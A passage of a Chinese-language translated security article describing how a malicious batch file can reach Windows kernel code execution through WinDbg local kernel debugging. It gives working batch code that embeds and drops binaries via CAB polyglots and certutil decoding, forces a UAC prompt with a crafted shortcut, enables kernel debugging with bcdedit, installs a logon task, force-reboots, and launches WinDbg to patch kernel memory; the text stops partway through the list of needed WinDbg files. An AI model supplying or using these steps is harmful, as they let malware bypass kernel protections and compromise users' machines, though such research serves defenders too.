# 【技术分享】利用WinDbg本地内核调试器攻陷 Windows 内核
|
##### 译文声明
本文是翻译文章，文章来源：vallejo.cc
原文地址：
译文仅供参考，具体内容表达以及含义原文为准。
译者：[shan66](http://bobao.360.cn/member/contribute?uid=2522399780)
预估稿费：200RMB
投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿
**  
**
**概要**
在本文中，我将为读者介绍一种利用windbg本地内核调试技术在Windows内核中执行代码的方法。当然，准确的说这并不是一个漏洞，因为这里只用到了windbg的正常功能，同时只使用了一个批处理文件（而不是powerhell或者vbs）和一些带有Microsoft的签名的可执行文件（其中一些已经是位于操作系统和windbg中的，我是通过批处理文件转储得到的）。
使用该方法，无需在用户模式下启动可执行文件（当然某些Microsoft签名的可执行文件除外）或加载已签名的驱动程序。因此，PatchGuard和其他保护措施也无法阻止我们。
通过该方法，我们会将代码直接放入内核内存空间中，然后通过hook一些线程来执行它。正如我们将演示的那样，由一个简单的批处理文件组成的恶意软件将能够跳转到内核，通过本地内核调试技术和windbg使其代码得以在内核中执行。
本文由五个部分组成：
**1. 将文件转储到批处理文件中：将二进制文件嵌入并转储到批处理文件中的几种方法。**
**2. 以管理员身份执行批处理文件：这里介绍从批处理文件到获得UAC提示符的方法（不使用powershell、vbs …）**
**3. 启用本地内核调试：如何从批处理文件中启用本地内核调试。**
**4.
使用windbg修补内核内存，从而注入并执行我们的代码：一种通过批处理文件使用windbg本地内核调试技术来修补内核内存并在内存中执行我们的代码的方法。**
**5. 最后，我们将把所有这些东西放在一起，打造一个概念验证式的批处理文件，它适用于Windows 8.1 x64机器，同时，我们还会进行一些相应的测试。
**
**1）将相关文件嵌入到磁盘上的批处理文件中**
****
实际上，可以有很多方法都可以达到该目的，这里挑几种加以介绍。
**1.1）创建一个.bab（也即.cab）：**
可以使用Microsoft工具makecab.exe（或Windows的早期版本中的cabarc.exe）来创建CAB文件。这些CAB文件用来存放我们要转储、压缩的文件。
但是我们还会添加一个未压缩的文件，即我们的第一个文件：我们的批处理文件。
要使用makecab.exe，我们必须给它提供一个.ddf文件的路径作为参数：
    makecab.exe / F makecab.ddf
该.ddf文件的作用是让makecab.exe创建CAB文件。 您可以在这里（
）找到有关makecab.exe的信息，以及从这里（ ）找到关于microsoft
cabinet格式的信息。
假设我们有一个setup.exe文件（我们想要转储到磁盘的可执行文件）和一个setup.bat文件（主批处理文件）。
**Setup.bat:**
    @echo off
    mkdir expanded
    expand %0 expanded -F:*
    expandedsetup.exe
    pause
    goto:eof
我们需要创建一个.ddf文件，其作用是让makecab.exe去创建一个包含setup.bat和setup.exe的CAB：
**Makecab.ddf:**
    .OPTION EXPLICIT ; Generate errors on variable typos
    .Set Cabinet=on
    .Set Compress=off
    .Set InfAttr= ; Turn off read-only, etc. attrs
    setup.bat 
    .Set Cabinet=on
    .Set Compress=on
    setup.exe
将setup.exe、setup.bat和makecab.ddf放在同一个目录中，然后执行命令：
    makecab.exe / F makecab.ddf
，这样就能获得相应的CAB文件了。
CAB文件的内容如下所示：
我们可以看到CAB文件中保存了两个文件，其中第一个文件是未压缩的批处理脚本，第二个文件是压缩过的setup.exe。
如果我们将.cab文件重命名为.bat，并执行该.bat文件，那么不会出现任何问题。第一个二进制文件的内容（CAB标头）将被批处理文件解释器忽略：它会尝试执行它，但它会显示错误消息，当解释器找到批处理未压缩的代码时，它会执行该代码，这时不会出现任何问题。这个批处理代码执行expand.exe，它是作为参数传递给我们的.bat文件（也就是CAB文件）的，并且CAB文件被解压缩到目录“expanded”中。
之后，就会执行setup.exe。
**1.2）转储ascii编码的二进制文件，使用certutil.exe进行解码：**
在本文中，我们将使用工具 **certutil.exe** （相关信息请看这里 ）将二进制文件编码为文本，并将其嵌入到批处理文件中：
    certutil -encode file.bin file.enc
file.bin是一个二进制文件，其中包含：
0x00 0x11 0x22 0x33 0x44 0x55 0x66 0x77 0x88 0x99 0xaa 0xbb 0xcc 0xdd 0xee
0xff
编码后，我们得到一个文本文件file.enc：
    -----BEGIN CERTIFICATE-----    ABEiM0RVZneImaq7zN3u/w==
    -----END CERTIFICATE-----
我们将这个文本嵌入到批处理文件中，即把它转储到磁盘，之后可以使用
    certutil -decode
将该文本再次解码为二进制文件。
**批处理文件：**
    @echo off
    call:DumpBlock setup.bat "%temp%file.enc" _____binstart_____ _____binend_____
    certutil -decode "%temp%file.enc" "%temp%file.bin"
    goto:eof
    :DumpBlock
    @echo off
    SetLocal EnableDelayedExpansion
    echo. %~1 %~2 %~3 %~4
    set SrcFile=%~1
    set DestFile=%~2
    set StartBlockMark=%~3
    set EndBlockMark=%~4
    set Flag=0
    del /F %DestFile%
    for /f "tokens=* delims=" %%a in ('type %SrcFile%') do (
    if !Flag! EQU 2 (echo "set Flag=1"&set Flag=1)
    if /i "%StartBlockMark%" EQU "%%a" (echo "set Flag=2"&set Flag=2) 
    if /i "%EndBlockMark%" EQU "%%a" (echo "set Flag=0"&set Flag=0) 
    if !Flag! EQU 1 (echo %%a >> %DestFile%)
    )
    goto:eof
    @echo off
     if "%~1"=="" (call :usage) else call :%*
    exit /b
    _____binstart_____
    -----BEGIN CERTIFICATE-----    ABEiM0RVZneImaq7zN3u/w==
    -----END CERTIFICATE-----    _____binend_____
正如我们在前面的代码中看到的，其有一个名为DumpBlock的函数。该函数会接收一个文件的路径和两个标签，将其作为批处理文件的参数，然后将这两个标签之间的内容转储到文件中。将文本转储到文件（file.enc）后，调用certutil将其解码为二进制文件：
    certutil -decode file.enc file.bin
通过这种方式，我们可以将文件（可执行文件或任何类型的文件）嵌入到批处理文件中，并在脚本执行时将其转储。
**2）以管理员身份执行批处理文件**
如果您使用的是PowerShell或Vbs，可以有多种方式让UAC提示用户以管理员身份执行我们的应用程序。但是，这里我只想使用批处理语法。
在通过批处理文件显示UAC提示方面，我决定另辟蹊径：转储指向我自己的批处理文件的.LNK文件。这个.LNK相当于勾选了“Run as
administrator”选项。这样，当.LNK重新启动我们的批处理文件时，如果我们没有管理员权限，将显示UAC提示符。
为了创建.LNK，我们可以创建一个简单的Windows链接，并设置“ **Run as administrator** ”选项：
如果我们将.lnk与另外一个没设置“以管理员身份”选项的.lnk进行比较，就会发现只有一个标志发生了变化：
为了创建自己的.LNK，还必须完成一项工作。当我们创建它时，Windows会将绝对路径插入目标文件中，但LNK文件只能使用相对路径和环境变量。
因此，我们需要使用十六进制编辑器将绝对路径改为相对路径：.setup.bat，或改为含有环境变量的路径：％temp％ setup.bat：
最后一步是将这个.lnk嵌入到批处理文件中，并使用第一部分中暴露的方法来转储它。 当.LNK文件就绪后，我们就可以将我们的bat复制到％temp％
setu_.bat，然后我们通过.lnk文件来执行它们了：
批处理文件：
    if "%CD%" == "%systemroot%system32" (
     if "%~dp0" == "%TEMP%" (
     rem HERE WE ARE BEING EXECUTED AS ADMIN 
     goto:eof
     )
    )
    copy setup.bat "%temp%setu_.bat"
    start %temp%promptUAC.lnk
**3）启用本地内核调试**
为了启用本地内核调试，需要重新启动计算机。当然，恶意软件在使用这个简单的代码通过批处理文件来启用本地内核调试和重新启动通常不会有太大的问题：
批处理文件：
    IF [%1]==[/DOONLOGON] GOTO ONLOGON
    bcdedit /debug on
    bcdedit /dbgsettings local
    schtasks /create /sc onlogon /tn setup /rl highest /tr "%0 /DOONLOGON"
    shutdown /r /f
    GOTO DONE
    :ONLOGON
    rem here local debugging is enabled and we run as administrator
    :DONE
您可以看到脚本是如何启用本地内核调试的，它会安装一个在重新启动后将要执行的任务，并重新启动计算机。
**4）使用windbg修补内核内存，以内核模式注入和执行我们的代码**
通过前面部分中介绍的方法，我们已经将所有需要的文件转储到了磁盘，并且已经可以让UAC提示用户获取管理员权限，同时我们也启用了内核本地调试。接下来的最后一步，是修补Windows内核内存，将我们的代码放到内核中，并在内核中挂接一些函数来执行我们的代码。
为此，我们将使用-kl选项（内核本地调试）和-c选项启动windbg，以启动我们的windbg脚本：
    start /min windbg -y "SRV*c:symbols*http://msdl.microsoft.com/download/symbols" -c"$$><jmpkernel_hookcreatefile.wdbg;q" -kl
而最重要的部分是windbg脚本 **jmpkernel_hookcreatefile.wdbg** 。您可以在下一段看到该脚本中的相关代码。
在这个脚本中，一些地址是我的目标测试机器，这里使用了硬编码方式。目标机器是Windows 8.1 Pro N
x64，ntoskrnl版本为6.3.9600.17668。当然，要想适应其他机器，或编写没有硬编码地址的通用脚本也并非难事。无论如何，由于这只是一个PoC，所以我用一些硬编码的地址来完成测试，以防止代码变得过于复杂。
对于这个脚本，重点在于，通过windbg本地调试器修补内核内存的关键是使用物理地址来写内存。本地内核调试器不运行我们修改一些内核内存地址（例如，如果我们要修补NtCreateFile函数，它是不允许的）。然而，我们可以将目标虚拟地址转换为物理地址，并将我们的修改写入物理地址。
将VA转换为物理地址的命令是!vtop。写入物理地址的命令是!eb。
此外，我们还得从批处理文件中转储windbg。当然，嵌入完整的windbg安装太过于疯狂。但是，我们这里只需要用到几个命令而已，所以我们只需要嵌入一个windbg二进制文件的子集就行了：
    dbgeng.dll